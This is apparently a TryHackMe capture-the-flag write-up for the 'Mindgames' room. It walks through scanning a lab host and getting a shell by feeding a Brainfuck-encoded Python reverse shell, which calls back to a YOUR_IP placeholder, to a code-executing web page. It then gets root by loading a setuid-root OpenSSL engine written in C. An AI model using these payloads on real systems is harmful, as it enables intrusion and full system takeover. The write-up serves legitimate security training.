# Mindgames - TryHackMe

Challenge Link: [Mindgames](https://tryhackme.com/room/mindgames)

![image]({{0xtaylur.github.io}}/assets/mindgames/mind.png)

## Summary
Mindgames is a hard rated box on TryHackMe. We're tasked with enumerating, gaining initial access,and then a somewhat tricky privilege escalation using a Library Load via OpenSSL.

## Recon

There wasn't that much enumeration to do since we only found 2 ports open: 22 running ssh and 80 running a HTTP server from our NMAP scan.
```
# Nmap 7.80 scan initiated Tue Jun 16 23:26:12 2020 as: nmap -sC -sV -o nmap 10.10.91.145
Nmap scan report for 10.10.91.145
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

We see that port 80 is open, so I decided to run a GoBuster scan to see if I could find anything. After about 10 minutes of scanning, I figured there were no directories on the site.
```
root@kali:~/THM/mindgames# gobuster dir -u 10.10.91.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.91.145
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/17 10:21:52 Starting gobuster
===============================================================
Progress: 19932 / 87665 (22.74%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/06/17 10:29:03 Finished
===============================================================
```

## Initial Shell

Let's go check out the page!
![image]({{0xtaylur.github.io}}/assets/mindgames/mindgames_page.png)

Hmmm, very intersting. It seems as if the the page decodes the _Brainfuck_ programming language. Let's see what happens when we throw the "Hello, World" section into the textbox.
![image]({{0xtaylur.github.io}}/assets/mindgames/hello_world.png)

It just prints _"Hello, World"_. Now let's see what happens when we try it with the Fibonacci brainfuck text.
![image]({{0xtaylur.github.io}}/assets/mindgames/fibonacci.png)

So it seems like it it runs the actual brainfuck progamming language. Let's see if we can try to get a reverse shell with this knowledge. I headed over to the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and used the python reverse shell code.
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

After I changed the default IP in that code block to my tun0 IP. (You can find that out by using the command _ifconfig_ in your terminal). I started a netcat session listening on port 1234. I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.

We successfully get a reverse shell as user: _mindgames_
![image]({{0xtaylur.github.io}}/assets/mindgames/initial_shell.png)

From here, we can go back one directory and read into _user.txt_
![image]({{0xtaylur.github.io}}/assets/mindgames/user.png)

## Privilege Escalation

Let's start off with using LinEnum to see if we can look into any interesting files that we can use to start our privilege escalation. On your host machine, change into your directory where you have _LinEnum_ stored. If you do not have LinEnum you can get it [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) by using the _wget_ command.

On your host machine, start a SimpleHTTPServer on port 8000 by using this command:
```
python -m SimpleHTTPServer
```

Change into the /tmp directory on your reverse shell, we can use the _wget_ command to put LinEnum.sh on the machine so we can run it.
```
$ wget YOUR_IP:8000/LinEnum.sh
--2020-06-17 15:36:21--  http://YOUR_IP:8000/LinEnum.sh
Connecting to YOUR_IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

     0K .......... .......... .......... .......... .....     100%  106K=0.4s

2020-06-17 15:36:22 (106 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
```

Now let's make it an executable file by using _chmod +x LinEnum.sh_. Run LinEnum by using "./LinEnum.sh".

After reading through LinEnum we find that _/usr/bin/openssl_ has [POSIX](https://uwsgi-docs.readthedocs.io/en/latest/Capabilities.html) capability.
![image]({{0xtaylur.github.io}}/assets/mindgames/openssl.png)

After a bit of research, I found a library load via OpenSSL using the C programming language. Create a C file named _engine.c_ and put this code block inside of it.
```
#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0);
    execl("/bin/sh", "sh", NULL);
}
```

After we have made this C file, we must compile it using this command:
```
gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -Lcrypto a.o
```

Once compiled, set up another SimpleHTTPServer and grab the engine.so file from your host machine onto the reverse shell.
```
$ wget YOUR_IP:8000/engine.so
--2020-06-17 15:55:53--  http://YOUR_IP:8000/engine.so
Connecting to YOUR_IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16024 (16K) [application/octet-stream]
Saving to: ‘engine.so’

     0K .......... .....                                      100% 71.8K=0.2s

2020-06-17 15:55:54 (71.8 KB/s) - ‘engine.so’ saved [16024/16024]
```

We can now open GTFOBins and search for an OpenSSL Library Load.
![image]({{0xtaylur.github.io}}/assets/mindgames/gtfo.png)

We can now run this command but switch out "./lib.so" with "./engine.so".
![image]({{0xtaylur.github.io}}/assets/mindgames/got_root.png)

We are now root! We should now be able to cat the root flag.
![image]({{0xtaylur.github.io}}/assets/mindgames/root.png)
